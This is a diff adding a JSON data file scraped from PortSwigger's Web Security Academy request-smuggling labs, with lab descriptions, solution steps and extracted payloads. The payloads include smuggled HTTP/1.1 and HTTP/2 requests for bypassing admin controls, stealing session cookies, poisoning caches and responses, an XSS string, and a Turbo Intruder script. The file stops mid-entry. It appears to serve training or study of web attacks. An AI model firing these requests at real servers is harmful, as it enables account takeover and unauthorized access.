@@ -1,0 +1,458 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling",
+    "category": "request-smuggling",
+    "title": "0.CL request smuggling",
+    "description": "Carlos visits the homepage every five seconds. To solve the lab, exploit the vulnerability to executealert()in his browser.",
+    "solution": "Livestream with James Kettle",
+    "payloads": [
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling",
+    "category": "request-smuggling",
+    "title": "H2.CL request smuggling",
+    "description": "This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.",
+    "solution": "Solving this lab requires a technique that we covered in the earlier\nHTTP request smuggling materials\nYou need to poison the connection immediately before the victim's browser attempts to import a JavaScript resource. Otherwise, it will fetch your payload from the exploit server but not execute it. You may need to repeat the attack several times before you get the timing right.",
+    "payloads": [
+      "alert(document.cookie)",
+      "Content-Length: 0",
+      "POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Length: 0\n\nSMUGGLED",
+      "GET /resources",
+      "https://YOUR-LAB-ID.web-security-academy.net/resources/",
+      "/resources",
+      "Host",
+      "POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Length: 0\n\nGET /resources HTTP/1.1\nHost: foo\nContent-Length: 5\n\nx=1",
+      "POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Length: 0\n\nGET /resources HTTP/1.1\nHost: YOUR-EXPLOIT-SERVER-ID.exploit-server.net\nContent-Length: 5\n\nx=1",
+      "GET /resources/"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection",
+    "category": "request-smuggling",
+    "title": "HTTP/2 request smuggling via CRLF injection",
+    "description": "This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.",
+    "solution": "To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the\nShift + Return\nkeys. Note that this feature is not available when you double-click on the header.",
+    "payloads": [
+      "Shift + Return",
+      "POST /",
+      "\\r\\n",
+      "Transfer-Encoding: chunked",
+      "bar\\r\\nTransfer-Encoding: chunked",
+      "0\n\nSMUGGLED",
+      "0\n\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nContent-Length: 800\n\nsearch=x",
+      "404 Not Found",
+      "search=x",
+      "POST"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection",
+    "category": "request-smuggling",
+    "title": "HTTP/2 request splitting via CRLF injection",
+    "description": "This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.",
+    "solution": "To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the\nShift + Return\nkeys. Note that this feature is not available when you double-click on the header.",
+    "payloads": [
+      "carlos",
+      "/admin",
+      "Shift + Return",
+      "GET /",
+      "\\r\\n",
+      "bar\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net",
+      "\\r\\n\\r\\n",
+      "GET /admin HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=STOLEN-SESSION-COOKIE",
+      "/admin/delete?username=carlos"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling",
+    "category": "request-smuggling",
+    "title": "Bypassing access controls via HTTP/2 request tunnelling",
+    "description": "This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at/adminas theadministratoruser and delete the usercarlos.",
+    "solution": "The front-end server appends a series of\nclient authentication headers\nto incoming requests. You need to find a way of leaking these.",
+    "payloads": [
+      "/admin",
+      "administrator",
+      "carlos",
+      "GET /",
+      "Host",
+      "foo: bar\\r\\nHost: abc",
+      "GET /?search=YOUR-SEARCH-QUERY",
+      "search",
+      "POST",
+      "Content-Length",
+      "foo: bar\\r\\nContent-Length: 500\\r\\n\\r\\nsearch=x",
+      "0 search results for 'x: xyz\nContent-Length: 644\ncookie: session=YOUR-SESSION-COOKIE\nX-SSL-VERIFIED: 0\nX-SSL-CLIENT-CN: null\nX-FRONTEND-KEY: YOUR-UNIQUE-KEY",
+      "HEAD",
+      "foo: bar\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nX-SSL-VERIFIED: 1\\r\\nX-SSL-CLIENT-CN: administrator\\r\\nX-FRONTEND-KEY: YOUR-UNIQUE-KEY\\r\\n\\r\\n",
+      ":path"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling",
+    "category": "request-smuggling",
+    "title": "Web cache poisoning via HTTP/2 request tunnelling",
+    "description": "This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.",
+    "solution_steps": [
+      "Send a request for GET / to Burp Repeater. Expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2.",
+      "Using the Inspector, try smuggling an arbitrary header in the :path pseudo-header, making sure to preserve a valid request line for the downgraded request as follows: Name :path Value /?cachebuster=1 HTTP/1.1 \\r\\n Foo: bar Observe that you still receive a normal response, confirming that you're able to inject via the :path .",
+      "Change the request method to HEAD and use the :path pseudo-header to tunnel a request for another arbitrary endpoint as follows: Name :path Value /?cachebuster=2 HTTP/1.1 \\r\\n Host: YOUR-LAB-ID.web-security-academy.net \\r\\n \\r\\n GET /post?postId=1 HTTP/1.1 \\r\\n Foo: bar Note that we've ensured that the main request is valid by including a Host header before the split. We've also left an arbitrary trailing header to capture the HTTP/1.1 suffix that will be appended to the request line by the front-end during rewriting.",
+      "Send the request and observe that you are able to view the tunnelled response. If you can't, try using a different postId .",
+      "Remove everything except the path and cachebuster query parameter from the :path pseudo-header and resend the request. Observe that you have successfully poisoned the cache with the tunnelled response.",
+      "Now you need to find a gadget that reflects an HTML-based XSS payload without encoding or escaping it. Send a response for GET /resources and observe that this triggers a redirect to /resources/ .",
+      "Try tunnelling this request via the :path pseudo-header, including an XSS payload in the query string as follows. Name :path Value /?cachebuster=3 HTTP/1.1 \\r\\n Host: YOUR-LAB-ID.web-security-academy.net \\r\\n \\r\\n GET /resources?<script>alert(1)</script> HTTP/1.1 \\r\\n Foo: bar Observe that the request times out. This is because the Content-Length header in the main response is longer than the nested response to your tunnelled request.",
+      "From the proxy history, check the Content-Length in the response to a normal GET / request and make a note of its value. Go back to your malicious request in Burp Repeater and add enough arbitrary characters after the closing </script> tag to pad your reflected payload so that the length of the tunnelled response will exceed the Content-Length you just noted.",
+      "Send the request and confirm that your payload is successfully reflected in the tunnelled response. If you still encounter a timeout, you may not have added enough padding.",
+      "While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the alert() fires.",
+      "In the Inspector, remove the cachebuster from your request and resend it until you have poisoned the cache. Keep resending the request every 5 seconds or so to keep the cache poisoned until the victim visits the home page and the lab is solved."
+    ],
+    "solution": "1. Send a request for GET / to Burp Repeater. Expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2.\n2. Using the Inspector, try smuggling an arbitrary header in the :path pseudo-header, making sure to preserve a valid request line for the downgraded request as follows: Name :path Value /?cachebuster=1 HTTP/1.1 \\r\\n Foo: bar Observe that you still receive a normal response, confirming that you're able to inject via the :path .\n3. Change the request method to HEAD and use the :path pseudo-header to tunnel a request for another arbitrary endpoint as follows: Name :path Value /?cachebuster=2 HTTP/1.1 \\r\\n Host: YOUR-LAB-ID.web-security-academy.net \\r\\n \\r\\n GET /post?postId=1 HTTP/1.1 \\r\\n Foo: bar Note that we've ensured that the main request is valid by including a Host header before the split. We've also left an arbitrary trailing header to capture the HTTP/1.1 suffix that will be appended to the request line by the front-end during rewriting.\n4. Send the request and observe that you are able to view the tunnelled response. If you can't, try using a different postId .\n5. Remove everything except the path and cachebuster query parameter from the :path pseudo-header and resend the request. Observe that you have successfully poisoned the cache with the tunnelled response.\n6. Now you need to find a gadget that reflects an HTML-based XSS payload without encoding or escaping it. Send a response for GET /resources and observe that this triggers a redirect to /resources/ .\n7. Try tunnelling this request via the :path pseudo-header, including an XSS payload in the query string as follows. Name :path Value /?cachebuster=3 HTTP/1.1 \\r\\n Host: YOUR-LAB-ID.web-security-academy.net \\r\\n \\r\\n GET /resources?<script>alert(1)</script> HTTP/1.1 \\r\\n Foo: bar Observe that the request times out. This is because the Content-Length header in the main response is longer than the nested response to your tunnelled request.\n8. From the proxy history, check the Content-Length in the response to a normal GET / request and make a note of its value. Go back to your malicious request in Burp Repeater and add enough arbitrary characters after the closing </script> tag to pad your reflected payload so that the length of the tunnelled response will exceed the Content-Length you just noted.\n9. Send the request and confirm that your payload is successfully reflected in the tunnelled response. If you still encounter a timeout, you may not have added enough padding.\n10. While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the alert() fires.\n11. In the Inspector, remove the cachebuster from your request and resend it until you have poisoned the cache. Keep resending the request every 5 seconds or so to keep the cache poisoned until the victim visits the home page and the lab is solved.",
+    "payloads": [
+      "alert(1)",
+      "GET /",
+      ":path",
+      "/?cachebuster=1 HTTP/1.1\\r\\nFoo: bar",
+      "HEAD",
+      "/?cachebuster=2 HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net\\r\\n\\r\\nGET /post?postId=1 HTTP/1.1\\r\\nFoo: bar",
+      "Host",
+      "HTTP/1.1",
+      "postId",
+      "GET /resources",
+      "/resources/",
+      "/?cachebuster=3 HTTP/1.1\\r\\nHost: YOUR-LAB-ID.web-security-academy.net\\r\\n\\r\\nGET /resources?<script>alert(1)</script> HTTP/1.1\\r\\nFoo: bar",
+      "Content-Length",
+      "</script>",
+      "alert()"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling",
+    "category": "request-smuggling",
+    "title": "Response queue poisoning via H2.TE request smuggling",
+    "description": "This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.",
+    "solution_steps": [
+      "Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2 before sending the request. POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+      "Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.",
+      "In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured. POST /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net Note Remember to terminate the smuggled request properly by including the sequence \\r\\n\\r\\n after the Host header.",
+      "Send the request to poison the response queue. You will receive the 404 response to your own request.",
+      "Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. Note If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.",
+      "Copy the session cookie and use it to send the following request: GET /admin HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=STOLEN-SESSION-COOKIE",
+      "Send the request repeatedly until you receive a 200 response containing the admin panel.",
+      "In the response, find the URL for deleting carlos ( /admin/delete?username=carlos ), then update the path in your request accordingly. Send the request to delete carlos and solve the lab."
+    ],
+    "solution": "1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request using chunked encoding as follows. Remember to expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2 before sending the request. POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED\n2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.\n3. In Burp Repeater, create the following request, which smuggles a complete request to the back-end server. Note that the path in both requests points to a non-existent endpoint. This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured. POST /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net Note Remember to terminate the smuggled request properly by including the sequence \\r\\n\\r\\n after the Host header.\n4. Send the request to poison the response queue. You will receive the 404 response to your own request.\n5. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie. Note If you receive some 200 responses but can't capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again.\n6. Copy the session cookie and use it to send the following request: GET /admin HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=STOLEN-SESSION-COOKIE\n7. Send the request repeatedly until you receive a 200 response containing the admin panel.\n8. In the response, find the URL for deleting carlos ( /admin/delete?username=carlos ), then update the path in your request accordingly. Send the request to delete carlos and solve the lab.",
+    "payloads": [
+      "carlos",
+      "/admin",
+      "POST / HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
+      "POST /x HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net",
+      "\\r\\n\\r\\n",
+      "Host",
+      "GET /admin HTTP/2\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=STOLEN-SESSION-COOKIE",
+      "/admin/delete?username=carlos"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling",
+    "category": "request-smuggling",
+    "title": "CL.0 request smuggling",
+    "description": "This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores theContent-Lengthheader on requests to some endpoints.",
+    "solution_steps": [
+      "From the Proxy > HTTP history , send the GET / request to Burp Repeater twice.",
+      "In Burp Repeater, add both of these tabs to a new group.",
+      "Go to the first request and convert it to a POST request (right-click and select Change request method ).",
+      "In the body, add an arbitrary request smuggling prefix. The result should look something like this: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /hopefully404 HTTP/1.1\nFoo: x",
+      "Change the path of the main POST request to point to an arbitrary endpoint that you want to test.",
+      "Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection) .",
+      "Change the Connection header of the first request to keep-alive .",
+      "Send the sequence and check the responses. If the server responds to the second request as normal, this endpoint is not vulnerable. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.",
+      "Deduce that you can use requests for static files under /resources , such as /resources/images/blog.svg , to cause a CL.0 desync."
+    ],
+    "solution": "1. From the Proxy > HTTP history , send the GET / request to Burp Repeater twice.\n2. In Burp Repeater, add both of these tabs to a new group.\n3. Go to the first request and convert it to a POST request (right-click and select Change request method ).\n4. In the body, add an arbitrary request smuggling prefix. The result should look something like this: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /hopefully404 HTTP/1.1\nFoo: x\n5. Change the path of the main POST request to point to an arbitrary endpoint that you want to test.\n6. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection) .\n7. Change the Connection header of the first request to keep-alive .\n8. Send the sequence and check the responses. If the server responds to the second request as normal, this endpoint is not vulnerable. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.\n9. Deduce that you can use requests for static files under /resources , such as /resources/images/blog.svg , to cause a CL.0 desync.",
+    "payloads": [
+      "Content-Length",
+      "/admin",
+      "carlos",
+      "GET /",
+      "POST",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /hopefully404 HTTP/1.1\nFoo: x",
+      "Connection",
+      "keep-alive",
+      "/resources",
+      "/resources/images/blog.svg",
+      "GET /admin/delete?username=carlos",
+      "POST /resources/images/blog.svg HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Length: CORRECT\n\nGET /admin/delete?username=carlos HTTP/1.1\nFoo: x"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync",
+    "category": "request-smuggling",
+    "title": "Client-side desync",
+    "description": "This lab is vulnerable to client-side desync attacks because the server ignores theContent-Lengthheader on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.",
+    "solution": "This lab is a client-side variation of a technique we covered in a\nprevious request smuggling lab\n.",
+    "payloads": [
+      "Content-Length",
+      "GET /",
+      "POST",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.h1-web-security-academy.net\nConnection: close\nContent-Length: CORRECT\n\nGET /hopefully404 HTTP/1.1\nFoo: x",
+      "Connection",
+      "keep-alive",
+      "fetch()",
+      "fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n    method: 'POST',\n    body: 'GET /hopefully404 HTTP/1.1\\r\\nFoo: x',\n    mode: 'cors',\n    credentials: 'include',\n}).catch(() => {\n        fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {\n        mode: 'no-cors',\n        credentials: 'include'\n    })\n})",
+      "catch()",
+      "GET /en/post?postId=x",
+      "postId",
+      "session",
+      "_lab_analytics",
+      "csrf",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.h1-web-security-academy.net\nConnection: keep-alive\nContent-Length: CORRECT\n\nPOST /en/post/comment HTTP/1.1\nHost: YOUR-LAB-ID.h1-web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\nContent-Type: x-www-form-urlencoded\nConnection: keep-alive\n\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment="
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling",
+    "category": "request-smuggling",
+    "title": "Server-side pause-based request smuggling",
+    "description": "This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints.",
+    "solution_steps": [
+      "In Burp, notice from the Server response header that the lab is using Apache 2.4.52 . This version of Apache is potentially vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects.",
+      "In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, GET /resources . Observe that you are redirected to /resources/ .",
+      "Right-click the request and select Extensions > Turbo Intruder > Send to Turbo Intruder .",
+      "In Turbo Intruder, convert the request to a POST request (right-click and select Change request method ).",
+      "Change the Connection header to keep-alive .",
+      "Add a complete GET /admin request to the body of the main request. The result should look something like this: POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net",
+      "In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \\r\\n\\r\\n sequence at the end of the headers: def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=1,\n                           requestsPerConnection=500,\n                           pipeline=False\n                           )\n\n    engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=61000)\n    engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    table.add(req)",
+      "Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table: The first entry is the POST /resources request, which triggered a redirect to /resources/ as normal. The second entry is a response to the GET /admin/ request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability."
+    ],
+    "solution": "1. In Burp, notice from the Server response header that the lab is using Apache 2.4.52 . This version of Apache is potentially vulnerable to pause-based CL.0 attacks on endpoints that trigger server-level redirects.\n2. In Burp Repeater, try issuing a request for a valid directory without including a trailing slash, for example, GET /resources . Observe that you are redirected to /resources/ .\n3. Right-click the request and select Extensions > Turbo Intruder > Send to Turbo Intruder .\n4. In Turbo Intruder, convert the request to a POST request (right-click and select Change request method ).\n5. Change the Connection header to keep-alive .\n6. Add a complete GET /admin request to the body of the main request. The result should look something like this: POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\n7. In the Python editor panel, enter the following script. This issues the request twice, pausing for 61 seconds after the \\r\\n\\r\\n sequence at the end of the headers: def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=1,\n                           requestsPerConnection=500,\n                           pipeline=False\n                           )\n\n    engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=61000)\n    engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    table.add(req)\n8. Launch the attack. Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table: The first entry is the POST /resources request, which triggered a redirect to /resources/ as normal. The second entry is a response to the GET /admin/ request. Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability.",
+    "payloads": [
+      "/admin",
+      "carlos",
+      "Server",
+      "Apache 2.4.52",
+      "GET /resources",
+      "/resources/",
+      "POST",
+      "Connection",
+      "keep-alive",
+      "GET /admin",
+      "POST /resources HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=YOUR-SESSION-COOKIE\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: CORRECT\n\nGET /admin/ HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net",
+      "\\r\\n\\r\\n",
+      "def queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=1,\n                           requestsPerConnection=500,\n                           pipeline=False\n                           )\n\n    engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=61000)\n    engine.queue(target.req)\n\ndef handleResponse(req, interesting):\n    table.add(req)",
+      "POST /resources",
+      "GET /admin/"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability",
+    "description": "This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at/admin, but the front-end server blocks access to it.",
+    "solution_steps": [
+      "Try to visit /admin and observe that the request is blocked.",
+      "Using Burp Repeater, issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: X",
+      "Observe that the merged request to /admin was rejected due to not using the header Host: localhost .",
+      "Issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 54\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nX-Ignore: X",
+      "Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.",
+      "Issue the following request twice so the second request's headers are appended to the smuggled request body instead: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=",
+      "Observe that you can now access the admin panel.",
+      "Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 139\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx="
+    ],
+    "solution": "1. Try to visit /admin and observe that the request is blocked.\n2. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: X\n3. Observe that the merged request to /admin was rejected due to not using the header Host: localhost .\n4. Issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 54\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nX-Ignore: X\n5. Observe that the request was blocked due to the second request's Host header conflicting with the smuggled Host header in the first request.\n6. Issue the following request twice so the second request's headers are appended to the smuggled request body instead: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=\n7. Observe that you can now access the admin panel.\n8. Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 139\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=",
+    "payloads": [
+      "/admin",
+      "carlos",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 37\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: X",
+      "Host: localhost",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 54\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nX-Ignore: X",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=",
+      "POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 139\nTransfer-Encoding: chunked\n\n0\n\nGET /admin/delete?username=carlos HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx="
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl",
+    "category": "request-smuggling",
+    "title": "Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability",
+    "description": "This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at/admin, but the front-end server blocks access to it.",
+    "solution_steps": [
+      "Try to visit /admin and observe that the request is blocked.",
+      "In Burp Suite, go to the Repeater menu and ensure that the \"Update Content-Length\" option is unchecked.",
+      "Using Burp Repeater, issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-length: 4\nTransfer-Encoding: chunked\n\n60\nPOST /admin HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0 Note You need to include the trailing sequence \\r\\n\\r\\n following the final 0 .",
+      "Observe that the merged request to /admin was rejected due to not using the header Host: localhost .",
+      "Issue the following request twice: POST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-length: 4\nTransfer-Encoding: chunked\n\n71\nPOST /admin HTTP/1.1\nHost: localhost\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nx=1\n0",
+      "Observe that you can now access the admin panel.",
